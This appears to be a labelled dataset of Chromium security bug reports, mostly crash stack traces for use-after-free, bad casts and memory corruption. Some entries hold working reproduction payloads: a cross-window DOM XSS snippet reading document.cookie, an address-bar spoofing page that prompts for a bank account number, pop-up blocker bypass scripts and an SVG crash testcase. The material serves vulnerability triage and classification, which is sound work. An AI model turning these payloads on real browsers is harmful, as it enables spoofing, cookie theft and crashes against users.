windowchangedkeystate 24 in cfarrayapplyfunction 25 in nsview windowchangedkeystate 26 in cfarrayapplyfunction 27 in nsview windowchangedkeystate 28 in nssplitview windowchangedkeystate 29 in cfarrayapplyfunction 30 in nsview windowchangedkeystate 31 in cfarrayapplyfunction 32 in nsview windowchangedkeystate 33 in cfarrayapplyfunction 34 in nsview windowchangedkeystate 35 in cfarrayapplyfunction 36 in nsview windowchangedkeystate 37 in cfarrayapplyfunction 38 in nsview windowchangedkeystate 39 in nsframeview windowchangedkeystate 40 in nswindow setframeneedsdisplay 41 in endkeyandmain 42 in nsapplication sendevent 43 in crapplication sendevent self cmd event at users/aarya/chrome/375/src/base/chrome_application_mac.mm:43 44 in nsapplication run 45 in base messagepumpnsapplication dorun this delegate at users/aarya/chrome/375/src/base/message_pump_mac.mm:677 46 in base messagepumpcfrunloopbase run this delegate at users/aarya/chrome/375/src/base/message_pump_mac.mm:213 47 in messageloop runinternal this at users/aarya/chrome/375/src/base/message_loop.cc:205 48 in messageloop runhandler this at users/aarya/chrome/375/src/base/message_loop.cc:177 49 in messageloop run this at users/aarya/chrome/375/src/base/message_loop.cc:155 50 in anonymous namespace runuimessageloop browser_process at users/aarya/chrome/375/src/chrome/browser/browser_main.cc:182 51 in browsermain parameters at users/aarya/chrome/375/src/chrome/browser/browser_main.cc:1174 52 in chromemain argc=3 argv at users/aarya/chrome/375/src/chrome/app/chrome_dll_main.cc:814 53 in main argc=3 argv at users/aarya/chrome/375/src/chrome/app/chrome_exe_main.mm:16	11
geolocation use after free credit kuzzcc kuzzcc emailed me on this again looked like a dup of previous bugs but then i synced to latest trunk 7.0.506.0 57453 and can reproduce the use after free there is clear memory corruption in m_service line 257 m_lastposition m_service lastposition stacktrace 632e656c name=webcore geolocation lastposition line 257 bytesname name=webcore geolocation setisallowed bool allowed=true line 450 bytesname name=webcore geolocationservicechromium setisallowed bool allowed=true line 49name name=webkit webgeolocationservicebridgeimpl setisallowed bool allowed=true line 156name name=geolocationdispatcher ongeolocationpermissionset int bridge_id=2 bool allowed=true line 86 bytesname name=dispatchtomethod geolocationdispatcher void thiscall geolocationdispatcher int bool int bool geolocationdispatcher obj void int bool method const tuple2 int bool arg line 554 bytesname name=ipc messagewithtuple tuple2 int bool dispatch geolocationdispatcher void thiscall geolocationdispatcher int bool const ipc message msg=class=16 index=167 geolocationdispatcher obj void int bool func line 944 bytesname name=geolocationdispatcher onmessagereceived const ipc message message=class=16 index=167 line 31 bytesname name=renderview onmessagereceived const ipc message message=class=16 index=167 line 673 bytesname name=messagerouter routemessage const ipc message msg=class=16 index=167 line 40 bytesname name=messagerouter onmessagereceived const ipc message msg=class=16 index=167 line 31 bytesname name=childthread onmessagereceived const ipc message msg=class=16 index=167 line 163 bytesname name=ipc channelproxy context ondispatchmessage const ipc message message=class=16 index=167 line 206 bytesname name=dispatchtomethod ipc channelproxy context void thiscall ipc channelproxy context ipc message const ipc message ipc channelproxy context obj void const ipc message method const tuple1 ipc message arg line 547 bytesname name=runnablemethod ipc channelproxy context void thiscall ipc channelproxy context ipc message const tuple1 ipc message run line 327 bytesname name=messageloop runtask task task line 408 bytesname name=messageloop deferorrunpendingtask const messageloop pendingtask pending_task line 420name name=messageloop dowork line 524 bytesname name=base messagepumpforui dorunloop line 202 bytesname name=base messagepumpwin runwithdispatcher base messagepump delegate delegate base messagepumpwin dispatcher dispatcher line 51 bytesname name=base messagepumpwin run base messagepump delegate delegate line 80 bytesname name=messageloop runinternal line 256 bytesname name=messageloop runhandler line 229name name=messageloop run line 207name name=base thread run messageloop message_loop line 141name name=base thread threadmain line 164 bytesname name anonymous namespace threadfunc void closure line 26 bytesname kernel32.dll basethreadinitthunk 12 bytes ntdll.dll rtluserthreadstart 8 bytes ntdll.dll rtluserthreadstart 8 bytes will take a closer look tmrw testcase enclosed can launch testcase from aarya/no_crawl/index.htm note that this would go away sooner or later	11
memory corruption on linux when render khmer script page there s a reliable sad-tab with m6 beta on linux with this page crashes are all over the shop in the tcmalloc allocator looks like a nasty case of memory corruption i also managed to get my new tab screen into a state where it sad-tabs every visit i believe this is because of trying to render simply the title of this page i believe this is linux specific perhaps a bug in harfbuzz or fontlinux.cpp it also seems to be a regression since 5.0.375.127 unless i m missing some font on my laptop a smaller repro is attached it s just a title really i get a sad tab if i open this page then hit view source refresh things a few times if you get no joy this is with tcmalloc unfortunately i just rebuilt without tcmalloc and it seems harder to trigger valgrind still mysteriously just exits even without tcmalloc	11
security extension history permission does not generate a warning installing an extension with only the history permission does not generate a can access your history warning unlike apps with the tabs permission this seems incorrect the history api gives even more direct access to user history than the tabs/windows apis do for reference check out this extension not mine which has the history permission but does not generate an install warning i m using 7.0.503.0 dev	2
spdyframer buffer resizing bug when expanding the control frame buffer the current logic has a bug which does not expand the buffer when the new size is less than 8bytes larger than the current size fortunately this is n't easy to trigger because our initial buffer size is 32kb	11
chrome cross window cross domain object access vulnerability details it is possible to let windows access other windows objects even though they are cross domain this can be done in spite of the sop by creating from an attacker s page an iframe with the name of the object the other window is trying to access and the overwriting it using javascript it works on every window reference if it is possible i d like to be posted about the time line for the fix and have credits as the discoverer of this issue as stefano di paola of mindedsecurity version chrome version chrome 6.0.472.55 operating system linux ubuntu and windows xp reproduction case victim host has a page like the following script document.writeln p window.opener.wwhframe.wwhhelp.mmessages.mbookmarklinkmessage p document.writeln p window.opener.wwhframe.wwhcontrols.fbookmarklink p script obviously it wo n't be directly exploitable as a domxss since the attacker can not control wwhframe object because of sop but attacker can use this evil page to trigger the xss document.body.innerhtml iframe name=wwhframe src iframe create the iframe with the name we want function go overwrite the name with an object wwhframe wwhhelp mmessages mbookmarklinkmessage scr ipt alert document.cookie scr ipt wwhcontrols fbookmarklink function return si=setinterval go,1 race condition for setting the value at the right time open blank after that the victim site will have access to the object itself and in some case will use those values in the page itself like writing or evaluating them in the document triggering a browser based dom xss of course that is a simple example using opener but it works for any window reference	2
invalid memory access with possible avenue to corruption in the xpath handling libxml vulnerability details google chrome processes this xml file email attachment the handling process tab will crash version chrome version latest version stable and beta operating system windows xp3/vista/7 linux and macos are likely to be affected reproduction case open file email attachment with google chrome	7
autofill profile address perfsonal info spam without any need of user interaction version affected v6 trunk 6.0.454.0 51494 because of a recent change in autofill behavior there is no infobar raised to save user profile address information as a result an evil webpage can autosubmit a form using javascript with junk values which get ultimately stored as an autofill entry in the user profile i would definitely wish to get the infobar back just like currently you use it just for cc data or otherwise we need to make sure there is explicit user interaction required before form data gets stored in the profile attaching testcase	11
autocomplete entries submitted by javascript should not be stored in db similar to autofill bug 48225 subject says it all we dont want auto submitted javascript to submit spam entries in a form field that was fixed for autofill bug 48225 but i still see it in autocomplete entries while we do restrict no of entries per autocomplete field we should n't be storing any one at all since it can kick off legitimate entries	11
render crash in formmanager findcachedformelement new crash in 458.1 on mac thread 0 crashed exc_bad_access kern_invalid_address google chrome framework form_manager.cc:752 formmanager findcachedformelement webkit_glue formdata const formmanager formelement google chrome framework form_manager.cc:585 formmanager clearpreviewedform webkit_glue formdata const google chrome framework render_view.cc:2148 renderview didclearautofillselection webkit webnode const google chrome framework autofillpopupmenuclient.cpp:190 webkit autofillpopupmenuclient popupdidhide google chrome framework webviewimpl.cpp:826 webkit webviewimpl applyautofillsuggestions webkit webnode const webkit webvector webkit webstring const webkit webvector webkit webstring const int google chrome framework webviewimpl.cpp:1780 webkit webviewimpl applyautocompletesuggestions webkit webnode const webkit webvector webkit webstring const int google chrome framework render_view.cc:1550 renderview onautocompletesuggestionsreturned int std vector std basic_string unsigned short base string16_char_traits std allocator unsigned short std allocator std basic_string unsigned short base string16_char_traits std allocator unsigned short const int google chrome framework base/tuple.h:435 renderview onmessagereceived ipc message const google chrome framework message_router.cc:40 messagerouter routemessage ipc message const google chrome framework base/tuple.h:422 runnablemethod ipc channelproxy context void ipc channelproxy context ipc message const tuple1 ipc message run google chrome framework message_loop.cc:366 messageloop runtask task google chrome framework message_loop.cc:375 messageloop deferorrunpendingtask messageloop pendingtask const google chrome framework message_loop.cc:482 messageloop dowork google chrome framework message_pump_mac.mm:291 base messagepumpcfrunloopbase runworksource void corefoundation cfrunloopdosources0 corefoundation cfrunlooprun corefoundation cfrunlooprunspecific corefoundation cfrunloopruninmode hitoolbox runcurrenteventloopinmode hitoolbox receivenexteventcommon hitoolbox blockuntilnexteventmatchinglistinmode appkit dpsnextevent appkit nsapplication nexteventmatchingmask untildate inmode dequeue appkit nsapplication run google chrome framework message_pump_mac.mm:677 base messagepumpnsapplication dorun base messagepump delegate google chrome framework message_pump_mac.mm:213 base messagepumpcfrunloopbase run base messagepump delegate google chrome framework message_loop.cc:214 messageloop run google chrome framework renderer_main.cc:292 renderermain mainfunctionparams const google chrome framework chrome_dll_main.cc:764 chromemain google chrome helper chrome_exe_main.mm:16 main google chrome helper	9
browser crash tabcontents expireinfobars possibly a variant of issue 47669 broken out because that issue is closed and this is happening on the mac dev channel i believe that the fix for that issue is in 472.4 so logging a new issue for triage purposes thread 0 crashed exc_bad_access kern_protection_failure google chrome framework tab_contents.cc:1462 tabcontents expireinfobars google chrome framework tab_contents.cc:3008 tabcontents observe google chrome framework notification_service.cc:119 notificationservice notify google chrome framework navigation_controller.cc:1073 navigationcontroller notifynavigationentrycommitted google chrome framework navigation_controller.cc:592 navigationcontroller rendererdidnavigate google chrome framework tab_contents.cc:2323 tabcontents didnavigate google chrome framework render_view_host.cc:987 renderviewhost onmsgnavigate google chrome framework render_view_host.cc:709 renderviewhost onmessagereceived google chrome framework browser_render_process_host.cc:844 browserrenderprocesshost onmessagereceived google chrome framework base/tuple.h:422 runnablemethod ipc channelproxy context void ipc channelproxy context const ipc message tuple1 ipc message run google chrome framework message_loop.cc:409 messageloop runtask google chrome framework message_loop.cc:418 messageloop deferorrunpendingtask google chrome framework message_loop.cc:525 messageloop dowork google chrome framework message_pump_mac.mm:291 base messagepumpcfrunloopbase runworksource corefoundation cfrunloopdosources0 corefoundation cfrunlooprun corefoundation cfrunlooprunspecific corefoundation cfrunloopruninmode hitoolbox runcurrenteventloopinmode hitoolbox receivenexteventcommon hitoolbox blockuntilnexteventmatchinglistinmode appkit dpsnextevent appkit nsapplication nexteventmatchingmask untildate inmode dequeue appkit nsapplication run google chrome framework message_pump_mac.mm:677 base messagepumpnsapplication dorun google chrome framework message_pump_mac.mm:213 base messagepumpcfrunloopbase run google chrome framework message_loop.cc:257 messageloop run google chrome framework browser_main.cc:355 browsermain google chrome framework chrome_dll_main.cc:889 chromemain google chrome chrome_exe_main.mm:16 main	9
omnibox url spoofing on pending events in page unload meta http-equiv refresh content 0 url=index.htm if content 1 address bar will not dispaly chrome newtab iframe src spoof.htm iframe index.htm script settimeout sleep 500 alert 2 alert twice function sleep document.write 123 br var mes prompt dear user ni need your bank account number document.write mes br script spoof.htm script document.documenturi=eval history.back null debug alert 1 script put index.htm spoof.htm 127.0.0.1 open a new tab visit	9
pop blocker bypass tested chromium testcase.htm base target some script history.go script	2
crash in chrome_browser_net_websocket_experiment websocketexperimentrunner doloop thread 8 crashed exception_access_violation_write chrome.dll websocket_experiment_runner.cc:175 chrome_browser_net_websocket_experiment websocketexperimentrunner doloop chrome.dll message_loop.cc:408 messageloop runtask task chrome.dll message_loop.cc:417 messageloop deferorrunpendingtask messageloop pendingtask const chrome.dll message_loop.cc:524 messageloop dowork chrome.dll message_pump_win.cc:465 base messagepumpforio dorunloop chrome.dll message_pump_win.cc:51 base messagepumpwin runwithdispatcher base messagepump delegate base messagepumpwin dispatcher chrome.dll message_pump_win.h:80 base messagepumpwin run base messagepump delegate chrome.dll message_loop.cc:256 messageloop runinternal chrome.dll message_loop.cc:228 messageloop runhandler chrome.dll message_loop.cc:206 messageloop run chrome.dll thread.cc:140 base thread run messageloop chrome.dll thread.cc:164 base thread threadmain chrome.dll platform_thread_win.cc:26 anonymous namespace threadfunc void kernel32.dll basethreadinitthunk ntdll.dll ntdll.dll	9
security insecure library loading in google chrome for linux received external report 686499149 i ve asked whether he has a google account to add to the bug hopefully he ll get back to me soon i ve discovered that google chrome as distributed for linux uses the ld_library_path environment variable unsafely in its startup script the following line in usr/bin/google-chrome sets this variable ld_library_path progdir progdir/lib ld_library_path note that if ld_library_path is previously unset as will usually be the case this leaves a dangling at the end of the variable which is interpreted by the linker as the current directory therefore if a user could be enticed into opening the chrome browser from an attacker-controlled directory that attacker could easily load maliciously crafted libraries in place of legitimate ones this can be trivially verified by placing a blank libc.so.6 file in a directory and attempting to launch google-chrome from there i have been unable to determine a remote vector for this issue this can easily be fixed by verifying that the ld_library_path environment variable is set before using it in a subsequent assignment please keep me posted on any progress including whether this will be assigned a cve identifier etc	11
renderer crash on very big animated gif image webcore rgba32buffer setrgba unsigned int unsigned int unsigned int unsigned int unsigned int chrome version 7.0.503.1 official build 57041 dev urls if applicable backup other browsers tested add ok or fail after other browsers where you have tested this issue safari 4 firefox 3.x fail ok ie 7 ie 8 ok what steps will reproduce the problem 1 open above url animated gif image actual size 10176x7632 px 2 observe ram consumption what is the expected result image is displayed browser and os are continuing to work normally or warning is displayed allocation of even more ram is stopped what happens instead huge amounts of ram are consumed until a on windows some ram is allocated sad tab is displayed ram is freed again b on linux all available ram ist allocated everything hangs until killing that chrome process which is n't that easy in this situation please provide any additional information below attach a screenshot if possible ie8 consumes about 110mb overall ff 3.6.8 on linux crashes as well ff 3.6 on windows needs about 360mb overall some image viewers crash as well this bug was reported to soup.io as well since the image should be only 48x48 px so there seems to be a bug on their side as well	11
html5 workers run outside of the sandbox vulnerability details an html5 dedicated worker clearly runs outside of the sandbox on at least the linux platform this is a problem because we normally run the javascript engine inside the sandbox therefore an attacker could abuse a worker to escape the sandbox if they had a bug in the javascript engine compiler or runtime if i understand correctly version chrome version 6.0.472.53 operating system ubuntu 9.04 32-bit reproduction case 1 visit and hit the start worker button 2 run the top utility to identify the worker process it will be called simply exe and running at nearly 100 cpu 3 note the pid of this process 4 ls l proc/pid 5 observe the cwd and root of this process lrwxrwxrwx 1 chris chris 0 2010-09-08 01:23 cwd home/chris lrwxrwxrwx 1 chris chris 0 2010-09-08 01:23 root i m not sure if this is some unimplemented thing on linux or if it s a generic cross-platform issue i do n't have a windows or mac os machine around to check and i m not an expert on the process exploration tools on those machines either cc cpu nsylvain who might know offhand if the windows build has workers running inside the sandbox	2
cross_fuzz deleted elements lingering in document m_elementsbyid ap filed in webkit land ap got a checkconsistency assertion failure with cross_fuzz this likely means an exploitable security issue as he has seen in the past 0 in wtf valuecheck webcore atomicstringimpl checkconsistency at valuecheck.h:45 1 in wtf hashtable webcore atomicstringimpl std pair webcore atomicstringimpl webcore element wtf pairfirstextractor std pair webcore atomicstringimpl webcore element wtf ptrhash webcore atomicstringimpl wtf pairhashtraits wtf hashtraits webcore atomicstringimpl wtf hashtraits webcore element wtf hashtraits webcore atomicstringimpl checktableconsistencyexceptsize at hashtable.h:1025 2 in wtf hashtable webcore atomicstringimpl std pair webcore atomicstringimpl webcore element wtf pairfirstextractor std pair webcore atomicstringimpl webcore element wtf ptrhash webcore atomicstringimpl wtf pairhashtraits wtf hashtraits webcore atomicstringimpl wtf hashtraits webcore element wtf hashtraits webcore atomicstringimpl checktableconsistency at hashtable.h:998 3 in wtf hashmap webcore atomicstringimpl webcore element wtf ptrhash webcore atomicstringimpl wtf hashtraits webcore atomicstringimpl wtf hashtraits webcore element checkconsistency at hashmap.h:319 4 in webcore document getelementbyid at document.cpp:909 5 in webcore document findanchor at document.cpp:4849 6 in webcore frameview scrolltoanchor at frameview.cpp:970 7 in webcore frameview scrolltofragment at frameview.cpp:949 8 in webcore frameloader loadinsamedocument at frameloader.cpp:1657 9 in webcore frameloader continuefragmentscrollafternavigationpolicy at frameloader.cpp:3337 10 in webcore frameloader callcontinuefragmentscrollafternavigationpolicy at frameloader.cpp:3326 11 in webcore policycallback call at policycallback.cpp:101 12 in webcore policychecker continueafternavigationpolicy at policychecker.cpp:160 13 in webframeloaderclient receivedpolicydecison at webframeloaderclient.mm:1271 14 in webframepolicylistener receivedpolicydecision at webframeloaderclient.mm:1864	9
investigate rte_fuzz crashes i hacked together a rich text editing fuzzer last week the fuzzer creates a crazy dom then applies lots of execcommands to random selections in it it triggers several renderer crashers in chrome most of which look exploitable annoyingly it also causes a lot of renderer hangs i m attaching the fuzzer to this bug googlers can also run it from	7
memory corruption in accessing floatptr of a textarea version chrome version 6.0.472.55 stable operating system win 7 and xp reproduction case just open the xhtml file type of crash tab crash state eax=013dd120 ebx=00d1db00 ecx=00d795a0 edx=00000ce6 esi=01437640 edi=00d1da10 eip=00000000 esp=0012f46c ebp=0012f494 iopl=0 nv up ei ng nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000283 00000000 childebp retaddr warning frame ip not in any known module following frames may be wrong 0012f468 021872ae 0012f494 0219d692 chrome_1c30000 hunspell_create_key 0012f4d0 021b46b3 chrome_1c30000 hunspell_create_key 0012f4fc 023c91aa chrome_1c30000 hunspell_create_key 0012f588 023cb1fd chrome_1c30000 hunspell_free_list ps it seems only your mouse cursor on the content window of chrome can trig the bug	7
bad cast on svg use element due to mismatched shadow and instance pointers chrome 7.0.544.0 dev chromium 8.0.551.0 62092 operating system windows xp sp3 testcase.svg svg xmlns xmlns xlink fecomponenttransfer id crash fecomponenttransfer use xlink href foo view id foo use xlink href crash use use use view use svg	9
use after free in htmltextformcontrolelement selection chrome version 6.0.472.63 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 4 firefox 3.x ok ie 7 ok ie 8 ok what steps will reproduce the problem 1 click on view inventory 2 click on a white table cell to activate it 3 hold down ctrl and press the left or right arrow key 4 your browser tab should crash what is the expected result the cell to the left or right of the activated cell should be activated while the original cell should be deactivated what happens instead the tab crashes please provide any additional information below attach a screenshot if possible i ve tracked the problem down to one specific method the method code is as follows deactivates a cell hiding its input field and showing its span field view.prototype.deactivatecell function cell show the span hide the input var label cell.descendants 0 var input cell.descendants 1 if label label.show if label.innerhtml 0 label.innerhtml if input input.addclassname hiddeninput input.hide if input.value 0 input.value the method is invoked in other situations of the web-app without causing the tab to crash it only crashes when invoked after a ctrl-left or ctrl-right event is processed the cell variable is not null the input variable is not null the input variable points to the right input that method should not crash the browser i could not reproduce this by isolating that small piece of code some other part of the web-app puts the browser into a state that causes the crash	11
segfault in x86_64/memset.s below skscalercontext getimage on linux a html-document with the content rt style webkit-text-stroke 21016 crash causes a segmentation falt in chromium 7.0.544.0 developer build 61416 built on ubuntu running on x86_64 ubuntu 10.10 the issue also affects current google chrome stable on the same machine program received signal sigsegv segmentation fault memset at sysdeps/x86_64/memset.s:1056 1056 sysdeps/x86_64/memset.s no such file or directory in sysdeps/x86_64/memset.s gdb bt 0 memset at sysdeps/x86_64/memset.s:1056 1 in skscalercontext getimage this origglyph at usr/include/bits/string3.h:86 2 in skglyphcache findimage this glyph at third_party/skia/src/core/skglyphcache.cpp:314 3 in d1g_nobounder_rectclip state glyph left value optimized out top=-122 at third_party/skia/src/core/skdraw.cpp:1309 4 in skdraw drawpostext this value optimized out text u bytelength value optimized out pos consty value optimized out scalarsperposition value optimized out paint value optimized out at third_party/skia/src/core/skdraw.cpp:1741 5 in skcanvas drawpostext this text bytelength=10 pos paint at third_party/skia/src/core/skcanvas.cpp:1209 6 in webcore font drawglyphs this value optimized out gc font value optimized out glyphbuffer value optimized out from value optimized out numglyphs=5 point at third_party/webkit/webcore/platform/graphics/chromium/fontlinux.cpp:136 7 in webcore font drawglyphbuffer this value optimized out context glyphbuffer gdb info registers rax 140737365426200 rbx 140737361731008 rcx 122 rdx 0 rsi 0 rdi 140737366392736 rbp rsp r8 535397624 r9 3145728 r10 8 r11 140737204992470 r12 140737365589016 r13 140737488294720 r14 140737488294800 r15 140737488294880 rip memset+2792 eflags pf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb disas rip-40 rip+32 dump of assembler code from to memset+2752 lea r8 r8 memset+2756 cmp r8 memset+2763 movntdq xmm0 rdi memset+2767 movntdq xmm0 rdi memset+2772 movntdq xmm0 rdi memset+2777 movntdq xmm0 rdi memset+2782 movntdq xmm0 rdi memset+2787 movntdq xmm0 rdi memset+2792 movntdq xmm0 rdi memset+2797 movntdq xmm0 rdi memset+2802 lea rdi rdi memset+2809 jge memset+2752 memset+2811 sfence memset+2814 add r8 rdi memset+2817 lea rip r11 memset+1491	11
webm crash in vp8_setup_intra_recon vulnerability details the attached files will cause a memory access error when loaded as a webm video credit timothy b terriberry version chrome version 7.0.517.41 stable operating system linux ubuntu 9.04 32-bit reproduction case webm file attached it sad-tabs chrome for crashes please include the following additional information gdb mozdbg registers rax rbx rcx rdx rsi rdi rbp rsp rip faulting instruction memset+58 mov byte ptr rdi al frame 0 in memset 1 in inline_memset_chk dest val=127 len=6 at string.h:80 2 in vp8_setup_intra_recon ybf at users/cdiehl/mozilla/trunk/media/libvpx/vp8/common/setupintrarecon.c:20 3 in vp8_decode_frame pbi at users/cdiehl/mozilla/trunk/media/libvpx/vp8/decoder/decodframe.c:829 4 in vp8dx_receive_compressed_data ptr size=29 source 1\003 time_stamp=0 at users/cdiehl/mozilla/trunk/media/libvpx/vp8/decoder/onyxd_if.c:346 5 in vp8_decode ctx data 1\003 data_sz=29 user_priv deadline=0 at users/cdiehl/mozilla/trunk/media/libvpx/vp8/vp8_dx_iface.c:424 6 in vpx_codec_decode ctx data 1\003 data_sz=29 user_priv deadline=0 at users/cdiehl/mozilla/trunk/media/libvpx/vpx/src/vpx_decoder.c:127	11
use after free of m_frame in frameloader loadwithdocumentloader chrome version 8.0.552.5 official build 62886 dev urls if applicable what steps will reproduce the problem 1 visit the url above with adblock 2.2.6 installed 2 middle click on the see post microsoft outlook address list can not be displayed link what is the expected result it is opened what happens instead aw snap this also happens in chrome 6 i m in windows 7	7
more bad casts in event handling similar to i can see more bad casts in event handling void imageeventlistener handleevent scriptexecutioncontext event event if event type eventnames resizeevent m_doc windowsizechanged else if event type eventnames clickevent mouseevent mouseevent static_cast mouseevent event void inspectordomstorageresource handleevent scriptexecutioncontext event event assert m_frontend assert eventnames storageevent event type storageevent storageevent static_cast storageevent event	9
bad cast to mouseevent in node defaulteventhandler chrome version 8.0.552.11 urls if applicable what steps will reproduce the problem 1 respond to a message in hotmail 2 click multiple times on a line while editing that message what is the expected result line select then deselect then select again just like when i am clicking like i m crazy in this text field the line i am clicking on gets selected/deselected/selected/deselected what happens instead select/deselect/select/crash please provide any additional information below attach a screenshot if possible sometimes you have to click 1000 times sometimes 2 times is enough os windows 7	9
bad cast in pageclicktracker handleevent need to check the cast crash report here mouse_event is badly casted void pageclicktracker handleevent const webdomevent event last_node_clicked_.reset dcheck event.ismouseevent const webdommouseevent mouse_event event.toconst webdommouseevent dcheck mouse_event.buttondown if mouse_event.button 0 return we are only interested in left clicks remember which node has focus before the click is processed we ll get a notification once the mouse event has been processed didhandlemouseevent we ll notify the listener at that point last_node_clicked mouse_event.target was_focused getfocusednode last_node_clicked	9
chrome_55000000 webcore feblend apply vulnerability details eax=fc5f9e66 ebx=007308a0 ecx=00733b10 edx=00000000 esi=0070fc70 edi=00000000 eip=55b85f1b esp=0030e990 ebp=0030e9fc iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_55000000 webcore feblend apply 55b85f1b ff1485fcec0d56 call dword ptr chrome_55000000 calleffect 560decfc eax 4 ds:0023:478c6694 2:024 u chrome_55000000 webcore feblend apply d b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\graphics\filters\feblend.cpp 134 55b85f1b ff1485fcec0d56 call dword ptr chrome_55000000 calleffect 560decfc eax 4 55b85f22 8b4c2428 mov ecx dword ptr esp+28h 55b85f26 8b490c mov ecx dword ptr ecx+0ch 55b85f29 8b542420 mov edx dword ptr esp+20h 55b85f2d 8b4904 mov ecx dword ptr ecx+4 55b85f30 8d343a lea esi edx+edi 55b85f33 83c410 add esp,10h 55b85f36 3b7104 cmp esi dword ptr ecx+4 2:024 kv childebp retaddr args to child 0030e9fc 559fdcde 0072a980 006c35b0 007309c0 chrome_55000000 webcore feblend apply conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\graphics\filters\feblend.cpp 134 0030ea54 559f6b63 006c35b0 0030eac8 00000001 chrome_55000000 webcore rendersvgresourcefilter postapplyresource conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgresourcefilter.cpp 266 0030ea78 559f838b 0030eac8 0030f148 0030eb40 chrome_55000000 webcore svgrendersupport finishrendersvgcontent conv cdecl d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\svgrendersupport.cpp 152 0030eaf4 5556448a 0030eb18 00000000 00000000 chrome_55000000 webcore rendersvgcontainer paint conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgcontainer.cpp 123 0030eb44 559f0696 0030eb78 00000000 00000000 chrome_55000000 webcore renderbox paint conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderbox.cpp 584 0030ebf4 554f50c5 0030ec58 00000000 00000000 chrome_55000000 webcore rendersvgroot paint conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgroot.cpp 192 0030eda4 554f52de 006c31ec 0030f148 0030f048 chrome_55000000 webcore renderlayer paintlayer conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderlayer.cpp 2463 0030edd0 554f51cb 006c31ec 006c31ec 0030f148 chrome_55000000 webcore renderlayer paintlist conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderlayer.cpp 2515 0030ef94 554f49c3 006c31ec 0030f148 0030f048 chrome_55000000 webcore renderlayer paintlayer conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderlayer.cpp 2484 0030efe0 554fd6e8 0030f148 0030f048 00000000 chrome_55000000 webcore renderlayer paint conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderlayer.cpp 2268 0030f010 554b3af5 0030f148 0030f048 0030f148 chrome_55000000 webcore frameview paintcontents conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\page\frameview.cpp 2004 0030f078 556b23db 0030f148 0030f0a8 0030f0e8 chrome_55000000 webcore scrollview paint conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\scrollview.cpp 818 0030f0c8 556b2458 006b9480 0030f148 00000000 chrome_55000000 webkit webframeimpl paintwithcontext conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webkit\chromium\src\webframeimpl.cpp 1829 0030f154 556aca30 006b9480 006810e0 0030f210 chrome_55000000 webkit webframeimpl paint conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webkit\chromium\src\webframeimpl.cpp 1851 0030f1b8 55126419 006810e0 0030f210 00000000 chrome_55000000 webkit webviewimpl paint conv thiscall d b\slave\chrome-official\build\src\third_party\webkit\webkit\chromium\src\webviewimpl.cpp 957 0030f224 55126797 006f4000 007336c0 00000000 chrome_55000000 renderwidget paintrect conv thiscall d b\slave\chrome-official\build\src\chrome\renderer\render_widget.cc 422 0030f348 55126527 006f4000 0071a834 5512850d chrome_55000000 renderwidget dodeferredupdate conv thiscall d b\slave\chrome-official\build\src\chrome\renderer\render_widget.cc 531 0030f354 5512850d 0030f394 0030f5dc 5512651e chrome_55000000 renderwidget calldodeferredupdate fpo 0,0,1 conv thiscall d b\slave\chrome-official\build\src\chrome\renderer\render_widget.cc 458 0030f370 550c2a8c 0030f3e0 0071a818 0030f4e8 chrome_55000000 runnablemethod renderwidget void thiscall renderwidget void tuple0 run conv thiscall d b\slave\chrome-official\build\src\base\task.h 327 0030f3a0 550c2b18 0030f4e8 0071a820 0030f4e8 chrome_55000000 messageloop runtask conv thiscall d b\slave\chrome-official\build\src\base\message_loop.cc 409 version chrome version 7.0.517.41 stable operating system windows 7 reproduction case open the attached file using chrome type of crash tab	7
security bypass pop-up blocker using javascript url in a pop-up the following code opens two sites the first one ends up in a blocked pop up the second one in a new tab through another blocked pop-up script window.open window.open javascript window.open script tested with 2.0.172.37 and 3.0.196.0 21522 this does not affect safari	2
msvr-10-0105 cross origin bypass using canvas and video the following software vulnerability report is highly confidential and should be limited in distribution to members of the engineering team within your organization with need-to-know for performance of security risk analysis and remediation we ask you to please direct all communications through msvr microsoft.com for business and legal continuity purposes and not to the individual finder or other contacts you may have at microsoft corporation while working on canvas we found a security bug in chrome and operas handling of the video tag canvas the canvas spec has a security section security-with-canvas-elements which explains how to mitigate information leakage from cross-origin scripts chrome does not mitigate risk when the original video url is redirected i have detailed 2 scenarios below to explain each case core issue the problem is that chrome is only evaluating the original url of the video when deciding whether or not to allow it to be rendered on a canvas and whether or not that canvas is considered origin-clean in a false-clean case chrome fails to notice that the original url goes to a cross-origin url and allows reading of the image from the canvas this should not be allowed in a false-dirty case chrome fails to notice that the redirect goes back to the original page and thus prevents reading of the image from the canvas this should be allowed i do not have poc handy for this but can provide sample html5 if required thanks steve manzuik microsoft vulnerability research msvr msvr microsoft.com	2
